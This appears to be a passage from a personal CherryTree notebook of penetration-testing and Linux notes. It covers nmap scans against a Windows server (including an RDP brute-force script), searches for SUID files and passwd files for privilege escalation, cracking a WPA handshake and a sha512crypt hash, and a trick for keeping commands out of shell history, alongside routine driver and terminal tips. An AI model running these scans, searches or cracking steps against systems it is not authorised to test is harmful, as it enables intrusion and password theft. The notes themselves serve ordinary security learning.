      <node name="nmap targeted" unique_id="310" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1718601588" ts_lastsave="1718601617">
        <rich_text># Using nmap to Target a Windows Server

## 1. Initial Discovery and OS Detection

# Scan for Open Ports and Detect Operating System:
nmap -sV -O &lt;target_ip&gt;
- `-sV`: Probe open ports to determine service/version info.
- `-O`: Enable OS detection to identify the operating system.

Example:
nmap -sV -O 192.168.1.100

## 2. Service Enumeration Specific to Windows

# Identify Windows-Specific Services:
nmap -p &lt;ports&gt; --script=smb-enum* &lt;target_ip&gt;
- `-p &lt;ports&gt;`: Specify relevant ports commonly used by Windows services (e.g., SMB, RDP).
- `--script=smb-enum*`: Use Nmap scripts (`smb-enum*`) to enumerate SMB (Server Message Block) services for potential vulnerabilities.

Example:
nmap -p 445,3389 --script=smb-enum* 192.168.1.100

## 3. Vulnerability Detection

# Scan for Common Vulnerabilities:
nmap --script vuln &lt;target_ip&gt;
- `--script vuln`: Run Nmap's vulnerability scripts against the target to detect known vulnerabilities.

Example:
nmap --script vuln 192.168.1.100

## 4. Additional Windows-Specific Checks

# Check for Remote Desktop Protocol (RDP):
nmap -p 3389 --script=rdp-*
- `-p 3389`: Scan specifically for the RDP port.
- `--script=rdp-*`: Use Nmap scripts to enumerate and check for vulnerabilities related to RDP.

Example:
nmap -p 3389 --script=rdp-brute 192.168.1.100
</rich_text>
      </node>
    </node>
    <node name="more Tools" unique_id="392" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="106" is_bold="0" foreground="" ts_creation="1728720361" ts_lastsave="1729190167">
      <rich_text scale="h1" weight="heavy">Some useful tools for hackers</rich_text>
      <node name="unix-privesc-check" unique_id="393" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728720434" ts_lastsave="1728720492">
        <rich_text scale="h1" weight="heavy">unix-privesc-check</rich_text>
        <rich_text>
/usr/bin/unix-privesc-check


</rich_text>
        <rich_text foreground="#c0c0bfbfbcbc">unix-privesc-check v1.4 ( http://pentestmonkey.net/tools/unix-privesc-check ) 
 
Usage: </rich_text>
        <rich_text foreground="#c0c0bfbfbcbc" weight="heavy">unix-privesc-check</rich_text>
        <rich_text foreground="#c0c0bfbfbcbc"> { </rich_text>
        <rich_text foreground="#c0c0bfbfbcbc" weight="heavy">standard</rich_text>
        <rich_text foreground="#c0c0bfbfbcbc"> | </rich_text>
        <rich_text foreground="#c0c0bfbfbcbc" weight="heavy">detailed</rich_text>
        <rich_text foreground="#c0c0bfbfbcbc"> } 
 
"standard" mode: Speed-optimised check of lots of security settings. 
 
"detailed" mode: Same as standard mode, but also checks perms of open file 
                 handles and called files (e.g. parsed from shell scripts, 
                 linked .so files).  This mode is slow and prone to false  
                 positives but might help you find more subtle flaws in 3rd 
                 party programs. 
 
This script checks file permissions and other settings that could allow 
local users to escalate privileges. 
 
Use of this script is only permitted on systems which you have been granted 
legal permission to perform a security assessment of.  Apart from this  
condition the GPL v2 applies. 
 
Search the output for the word 'WARNING'.  If you don't see it then this 
script didn't find any problems.
 </rich_text>
        <rich_text>
</rich_text>
      </node>
      <node name="searching" unique_id="396" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1729098853" ts_lastsave="1729831693">
        <rich_text scale="h3" foreground="#f9f9f0f06b6b" weight="heavy">find:</rich_text>
        <rich_text>
find / -perm -4000 -type f 2&gt;/dev/null
find / "passwd" 2&gt;/dev/null | grep "passwd"
find /etc "passwd" 2&gt;/dev/null | grep "passwd"

</rich_text>
        <rich_text scale="h3" foreground="#f9f9f0f06b6b" weight="heavy">getcap:</rich_text>
        <rich_text>
getcap -r / 2&gt;/dev/null

</rich_text>
        <rich_text scale="h3" foreground="#f9f9f0f06b6b" weight="heavy">Hint:</rich_text>
        <rich_text>
</rich_text>
        <rich_text weight="heavy">2&gt; /dev/null</rich_text>
        <rich_text> means that, </rich_text>
        <rich_text style="italic" weight="heavy">redirect</rich_text>
        <rich_text> the </rich_text>
        <rich_text style="italic" weight="heavy">error</rich_text>
        <rich_text> output from this command to </rich_text>
        <rich_text style="italic" weight="heavy">/dev/null</rich_text>
        <rich_text>. </rich_text>
        <rich_text foreground="#c0c0bfbfbcbc">Essentially meaning, just get rid of the error messages</rich_text>
        <rich_text>.</rich_text>
      </node>
    </node>
  </node>
  <node name="FAG" unique_id="290" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="13" is_bold="0" foreground="" ts_creation="1718587616" ts_lastsave="1730250190">
    <rich_text scale="h1">FAQ</rich_text>
    <rich_text>
</rich_text>
    <node name="SHELL Tree" unique_id="397" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="5" is_bold="0" foreground="" ts_creation="1729099902" ts_lastsave="1729191417">
      <rich_text scale="h1" weight="heavy">SHELL Tree</rich_text>
      <rich_text>(Quick View)</rich_text>
      <rich_text scale="h1" weight="heavy">:</rich_text>
      <rich_text weight="heavy">
</rich_text>
      <rich_text>
</rich_text>
      <rich_text foreground="#c0c0bfbfbcbc" weight="heavy">• Real Path</rich_text>
      <rich_text foreground="#c0c0bfbfbcbc">:</rich_text>
      <rich_text foreground="#9a9a99999696">
	$ /bin/sh -&gt; /usr/bin/sh
	$ /bin/bash -&gt; /usr/bin/bash


</rich_text>
      <rich_text foreground="#c0c0bfbfbcbc" weight="heavy">• $PATH:</rich_text>
      <rich_text foreground="#9a9a99999696">
	1. /usr/bin
	2. /usr/sbin
      ☐ ./sh
      ☐ ./bash
      ☑ ./zsh

</rich_text>
      <rich_text foreground="#c0c0bfbfbcbc" weight="heavy">
• Similar:</rich_text>
      <rich_text foreground="#9a9a99999696">
	☐ $ bash
	☐ $ sh

	☐ $ /usr/bin/bash
	☐ $ /usr/bin/sh

</rich_text>
      <rich_text foreground="#c0c0bfbfbcbc" weight="heavy">
• Whatis:</rich_text>
      <rich_text foreground="#9a9a99999696">
	☐ $ whatis zsh
	☐ zsh (1)              - the Z shell

	☐ $ whatis sh
	☐ sh (1)               - command interpreter (shell)

	☐ $ whatis bash
	☐ bash (1)             - GNU Bourne-Again SHell
</rich_text>
    </node>
    <node name="Find Applications" unique_id="293" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="39" is_bold="0" foreground="" ts_creation="1718588651" ts_lastsave="1729191453">
      <rich_text>☐ Application Finder

command:	xfce4-appfinder --collapsed
shortcut:		</rich_text>
      <rich_text background="#2626a2a26969">ALT</rich_text>
      <rich_text> + </rich_text>
      <rich_text background="#2626a2a26969">F2</rich_text>
      <rich_text>

</rich_text>
      <rich_text background="#3d3d38384646"># run the command instead finding them
# Example:
# proxychains firefox
# proxychains qterminal/gnome-terminal</rich_text>
    </node>
    <node name="Handshake/EAPOL" unique_id="312" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="146" is_bold="0" foreground="" ts_creation="1723906001" ts_lastsave="1729191851">
      <rich_text># How to recover hash from a handshake file (.cap)
# Extract EAPOL from (airodump-ng) .cap file

[SOURCE] </rich_text>
      <rich_text link="webs https://hashcat.net/forum/thread-11853.html">https://hashcat.net/forum/thread-11853.html</rich_text>
      <rich_text>
[SOURCE] </rich_text>
      <rich_text link="webs https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2">https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2</rich_text>
      <rich_text>
</rich_text>
      <node name=".cap to .hc22000" unique_id="311" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1723905989" ts_lastsave="1724179294">
        <rich_text># convert cap to hc22000
</rich_text>
        <rich_text family="monospace">$ hcxpcapngtool -o induction.hc22000 wpa-Induction.pcap</rich_text>
        <rich_text>

# recover with hashcat
</rich_text>
        <rich_text family="monospace">$ hashcat -m 22000 induction.hc22000 -a 3 Induction</rich_text>
      </node>
    </node>
    <node name="Open a terminal page" unique_id="291" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="21" is_bold="0" foreground="" ts_creation="1718587641" ts_lastsave="1729191475">
      <rich_text>☐ Short Cut:

</rich_text>
      <rich_text background="#2626a2a26969">alt</rich_text>
      <rich_text> + </rich_text>
      <rich_text background="#2626a2a26969">ctrl</rich_text>
      <rich_text> + </rich_text>
      <rich_text background="#2626a2a26969">T</rich_text>
      <rich_text>



☐ Commands

gnome-terminal
qterminal
exo-open --launch TerminalEmulator</rich_text>
    </node>
    <node name="Survive terminal close" unique_id="294" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="21" is_bold="0" foreground="" ts_creation="1718589683" ts_lastsave="1729191800">
      <rich_text># 1
$ nohup

# 2
$ disown

# 3
$ (applicationName &amp;)
</rich_text>
      <rich_text foreground="#777776767b7b">example: linux@linux-desktop:~$ (chromium-browser &amp;)</rich_text>
      <rich_text>
</rich_text>
    </node>
    <node name="Dont save commands" unique_id="351" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="21" is_bold="0" foreground="" ts_creation="1724982155" ts_lastsave="1729191804">
      <rich_text scale="h3" weight="heavy"># Use a space ‘</rich_text>
      <rich_text scale="h3" background="#9999c1c1f1f1" weight="heavy"> </rich_text>
      <rich_text scale="h3" weight="heavy">’ in start</rich_text>
      <rich_text>
$ip a
$</rich_text>
      <rich_text background="#9999c1c1f1f1"> </rich_text>
      <rich_text>ip a
</rich_text>
    </node>
    <node name="Kill a User" unique_id="364" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="42" is_bold="0" foreground="" ts_creation="1727983301" ts_lastsave="1729191485">
      <rich_text family="monospace">pkill -KILL -u yourusername</rich_text>
    </node>
    <node name="Kali WindowsManager" unique_id="365" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="165" is_bold="0" foreground="" ts_creation="1727983359" ts_lastsave="1729191508">
      <rich_text>Window Manager:
</rich_text>
      <rich_text family="monospace">xfwm4
xfwm4 --replace</rich_text>
      <rich_text>


Xfce:
</rich_text>
      <rich_text family="monospace">startxfce4</rich_text>
      <rich_text>


lightdm:
</rich_text>
      <rich_text family="monospace">systemctl restart lightdm</rich_text>
      <rich_text>
</rich_text>
      <rich_text family="monospace">service lightdm restart</rich_text>
    </node>
    <node name="Realtek Drivers" unique_id="368" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="167" is_bold="0" foreground="" ts_creation="1728072865" ts_lastsave="1729194433">
      <rich_text scale="h1">Realtek RTL8188FTV WiFi Adapter on Linux</rich_text>
      <rich_text>
FORM	:	</rich_text>
      <rich_text link="webs https://forums.debian.net/viewtopic.php?t=155331">https://forums.debian.net/viewtopic.php?t=155331</rich_text>
      <rich_text>
SOURCE	:	</rich_text>
      <rich_text link="webs https://github.com/1999AZZAR/use-RTL8188FTV-on-linux">https://github.com/1999AZZAR/use-RTL8188FTV-on-linux</rich_text>
      <rich_text>

</rich_text>
      <rich_text foreground="#eded33333b3b">$	:	Normal User
#	:	root</rich_text>
      <rich_text>

$ ip a
</rich_text>
      <rich_text foreground="#9a9a99999696">Realtek Semiconductor Corp. RTL8188FTV 802.11b/g/n 1T1R 2.4G WLAN Adapter</rich_text>
      <rich_text>

# apt install firmware-realtek

# apt install net-tools

# add-apt-repository ppa:kelebek333/kablosuz
# apt update

-[FIX]

# apt-get install rtl8188fu-dkms
# apt purge rtl8188fu-dkms

$ echo "options rtl8188fu rtw_ips_mode=0 | sudo tee /etc/modprobe.d/rtl8188fu.conf
$ modprobe -rv rtl8188fu &amp;&amp; sudo modprobe -v rtl8188fu</rich_text>
      <node name="Errors" unique_id="376" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="43" is_bold="0" foreground="" ts_creation="1728353942" ts_lastsave="1728356727">
        <rich_text>• </rich_text>
        <rich_text weight="heavy">if</rich_text>
        <rich_text> you had problem with “</rich_text>
        <rich_text foreground="#f6f661615151">add-apt-repository ppa:kelebek333/kablosuz</rich_text>
        <rich_text>” you may need to install "python3-launchpadlib"
</rich_text>
        <rich_text family="monospace">sudo apt install python3-launchpadlib</rich_text>
        <rich_text>

• </rich_text>
        <rich_text weight="heavy">if</rich_text>
        <rich_text> you see “</rich_text>
        <rich_text foreground="#f6f661615151">sub-process /usr/bin/dpkg returned an error code (1)</rich_text>
        <rich_text>” :
(source: </rich_text>
        <rich_text link="webs https://phoenixnap.com/kb/fix-sub-process-usr-bin-dpkg-returned-error-code-1">https://phoenixnap.com/kb/fix-sub-process-usr-bin-dpkg-returned-error-code-1</rich_text>
        <rich_text>)

1. Reconfigure dpkg Database
</rich_text>
        <rich_text family="monospace">sudo dpkg --configure -a</rich_text>
        <rich_text>
The </rich_text>
        <rich_text family="monospace" weight="heavy">-a</rich_text>
        <rich_text> flag tells </rich_text>
        <rich_text family="monospace" weight="heavy">dpkg</rich_text>
        <rich_text> to configure all packages that are currently installed but have not been configured yet.

2. Fix Broken Dependencies
</rich_text>
        <rich_text family="monospace">sudo apt install -f</rich_text>
        <rich_text>
The </rich_text>
        <rich_text family="monospace" weight="heavy">-f</rich_text>
        <rich_text> option is short for </rich_text>
        <rich_text family="monospace" weight="heavy">--fix-broken</rich_text>
        <rich_text>, and you can specify either the short or the long form. It┬árepairs any broken dependencies in your package manager.

</rich_text>
        <rich_text weight="heavy">3. Remove Bad Package and Associated Files</rich_text>
        <rich_text> [SOLVED]
</rich_text>
        <rich_text family="monospace">sudo apt remove --purge [package_name]</rich_text>
        <rich_text>

4. Remove Unused Packages
</rich_text>
        <rich_text family="monospace">sudo apt autoremove</rich_text>
        <rich_text>
</rich_text>
        <rich_text family="monospace">sudo apt clean</rich_text>
        <rich_text>

5: Overwrite Bad Package (</rich_text>
        <rich_text foreground="#f6f661615151">Warning:</rich_text>
        <rich_text foreground="#f5f5c2c21111"> Beware of system breakdown possibility</rich_text>
        <rich_text>)
</rich_text>
        <rich_text family="monospace">sudo dpkg -i --force-overwrite /var/cache/apt/archives/[package_name]</rich_text>
        <rich_text>

Other ways:
</rich_text>
        <rich_text family="monospace">sudo apt --fix-broken install
sudo apt install --reinstall [PACKAGE]</rich_text>
      </node>
    </node>
    <node name="ETag vuln" unique_id="369" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="65" is_bold="0" foreground="" ts_creation="1728089310" ts_lastsave="1729191713">
      <rich_text>ETags have had a bit of a bad rap in the past as they have been used  to enable cookie-less tracking, where the server sends unique ETag for  one resource for each source IP address. See </rich_text>
      <rich_text link="webs http://www.arctic.org/~dean/tracking-without-cookies.html">tracking without cookies</rich_text>
      <rich_text> for more information.

</rich_text>
      <rich_text scale="h3">Why could this be a vulnerability?</rich_text>
      <rich_text>
As the implementation of the contents is implementation only, web  servers implement it in different ways. Some servers, such as Apache  httpd, use the metadata for the file to create the ETag header. An  example of an Apache httpd ETag, showing all fields can be seen below:

---

</rich_text>
      <rich_text weight="heavy">$ curl -I/--head  [IP]</rich_text>
      <rich_text>
ETag: 904b0-65-5d4e7f6f9b6c7


There are three hex fields in the ETag:
• 904b0 – the inode of the file
• 65 – the size of the file
• 5d4e7f6f9b6c7 – the mtime (the time the file was last modified) as a 32-bit or 64-bit integer

Let’s convert those hex digits to numbers:
◇ inode:    591024
◇ Size:       101 bytes
◇ mtime:  Thu Jan 06 2022 11:13:49

---

The </rich_text>
      <rich_text link="webs https://en.wikipedia.org/wiki/Inode">inode</rich_text>
      <rich_text> (Index Node), is where this information </rich_text>
      <rich_text weight="heavy">could</rich_text>
      <rich_text> cause a security vulnerability.</rich_text>
    </node>
    <node name="Hash" unique_id="398" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="40" is_bold="0" foreground="" ts_creation="1729187327" ts_lastsave="1729194533">
      <rich_text>Hash/Hashing

In computer science, a hash is a value generated from a string of text or data using a specific algorithm, known as a hash function. The purpose of a hash function is to transform input data (of any size) into a fixed-size output, usually a short and unique code. This output, called a hash value or digest, is used for tasks like data comparison, verification, or efficient data retrieval.

Hashing is commonly used in data structures (like hash tables), cryptography, and checksums for integrity verification.</rich_text>
      <node name="Hash Analyze" unique_id="390" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728638231" ts_lastsave="1729187617">
        <rich_text scale="h1">• </rich_text>
        <rich_text scale="h1" weight="heavy">Offline</rich_text>
        <rich_text> (commands)

</rich_text>
        <rich_text weight="heavy">Command</rich_text>
        <rich_text>: hash-identifier
</rich_text>
        <rich_text foreground="#f9f9f0f06b6b">Possible Hashs:
[+] </rich_text>
        <rich_text foreground="#f9f9f0f06b6b" weight="heavy">SHA-256</rich_text>
        <rich_text>

</rich_text>
        <rich_text weight="heavy">Command</rich_text>
        <rich_text>: john &lt;hashfile&gt;
</rich_text>
        <rich_text foreground="#f9f9f0f06b6b">Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])</rich_text>
        <rich_text>



</rich_text>
        <rich_text scale="h1">• </rich_text>
        <rich_text scale="h1" weight="heavy">Online</rich_text>
        <rich_text>

</rich_text>
        <rich_text weight="heavy">Website</rich_text>
        <rich_text>: </rich_text>
        <rich_text link="webs https://hashes.com/en/tools/hash_identifier">https://hashes.com/en/tools/hash_identifier</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#f9f9f0f06b6b">$6$wQb5nV3T$xB2WO/jOkbn4t1RUILrckw69LR/0EMtUbFFCYpM3MUHVmtyYW9.ov/aszTpWhLaC2x6Fvy5tpUUxQbUhCKbl4/
</rich_text>
        <rich_text foreground="#f9f9f0f06b6b" weight="heavy">marlinspike</rich_text>
        <rich_text foreground="#f9f9f0f06b6b"> - Possible algorithms: </rich_text>
        <rich_text foreground="#f9f9f0f06b6b" weight="heavy">sha512crypt</rich_text>
        <rich_text foreground="#f9f9f0f06b6b"> $6$, </rich_text>
        <rich_text foreground="#f9f9f0f06b6b" weight="heavy">SHA512</rich_text>
        <rich_text foreground="#f9f9f0f06b6b"> (Unix)</rich_text>
        <rich_text>

</rich_text>
        <rich_text weight="heavy">Website</rich_text>
        <rich_text>: </rich_text>
        <rich_text link="webs https://www.onlinehashcrack.com/hash-identification.php">https://www.onlinehashcrack.com/hash-identification.php</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#f9f9f0f06b6b">Your hash may be one of the following:
- </rich_text>
        <rich_text foreground="#f9f9f0f06b6b" weight="heavy">SHA-512</rich_text>
        <rich_text foreground="#f9f9f0f06b6b"> Crypt</rich_text>
      </node>
      <node name="Create Hash" unique_id="399" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1729187339" ts_lastsave="1729253459">
        <rich_text scale="h1">#1		</rich_text>
        <rich_text scale="h1" weight="heavy">openssl</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#3333d1d17a7a">$ openssl passwd -1 </rich_text>
        <rich_text>password
</rich_text>
        <rich_text foreground="#3333d1d17a7a">$ openssl dgst -sha256 &lt;&lt;&lt; </rich_text>
        <rich_text>password
</rich_text>
        <rich_text weight="heavy">
</rich_text>
        <rich_text scale="h1">#2		</rich_text>
        <rich_text scale="h1" weight="heavy">mkpasswd</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#3333d1d17a7a">$ mkpasswd -m md5</rich_text>
        <rich_text foreground="#2e2ec2c27e7e"> </rich_text>
        <rich_text>password

</rich_text>
        <rich_text scale="h1">#3</rich_text>
        <rich_text scale="h1" weight="heavy">		md5sum</rich_text>
        <rich_text> (Xsum)
</rich_text>
        <rich_text foreground="#3333d1d17a7a">$ md5sum</rich_text>
        <rich_text>	PATH.txt </rich_text>
        <rich_text foreground="#3333d1d17a7a">&gt;</rich_text>
        <rich_text> output.hash
</rich_text>
        <rich_text foreground="#3333d1d17a7a">$ sha256sum</rich_text>
        <rich_text>	PATH.txt </rich_text>
        <rich_text foreground="#3333d1d17a7a">&gt;</rich_text>
        <rich_text> output.hash
</rich_text>
        <rich_text foreground="#3333d1d17a7a">$ b2sum</rich_text>
        <rich_text>		PATH.txt </rich_text>
        <rich_text foreground="#3333d1d17a7a">&gt;</rich_text>
        <rich_text> output.hash

</rich_text>
        <rich_text scale="h1">#		</rich_text>
        <rich_text scale="h1" weight="heavy">echo</rich_text>
        <rich_text>
|_ X</rich_text>
        <rich_text weight="heavy">sum</rich_text>
        <rich_text>
| |_</rich_text>
        <rich_text foreground="#3333d1d17a7a">$ echo -n </rich_text>
        <rich_text>password</rich_text>
        <rich_text foreground="#3333d1d17a7a"> | sha256sum</rich_text>
        <rich_text>
| |_</rich_text>
        <rich_text foreground="#3333d1d17a7a">$ echo -n </rich_text>
        <rich_text>password</rich_text>
        <rich_text foreground="#3333d1d17a7a"> | md5sum</rich_text>
        <rich_text>
| |_</rich_text>
        <rich_text foreground="#3333d1d17a7a">$ echo -n </rich_text>
        <rich_text>password</rich_text>
        <rich_text foreground="#3333d1d17a7a"> | b2sum</rich_text>
        <rich_text>
|
|_ </rich_text>
        <rich_text weight="heavy">openssl</rich_text>
        <rich_text>
  |_</rich_text>
        <rich_text foreground="#3333d1d17a7a">$ echo -n</rich_text>
        <rich_text> password </rich_text>
        <rich_text foreground="#3333d1d17a7a">| openssl dgst -sha256</rich_text>
      </node>
    </node>
  </node>
</cherrytree>
